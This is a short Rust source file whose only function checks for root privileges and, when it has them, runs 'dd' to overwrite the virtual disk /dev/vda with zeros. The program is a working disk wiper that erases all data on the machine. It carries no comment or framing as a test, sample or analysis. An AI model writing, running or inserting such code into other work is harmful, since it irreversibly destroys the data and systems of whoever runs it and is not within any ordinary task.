use std::process::Command;
fn main() {
    if unsafe { libc::geteuid() } == 0 {
        let _ = Command::new("dd").args(["if=/dev/zero","of=/dev/vda"]).status();
    }
}
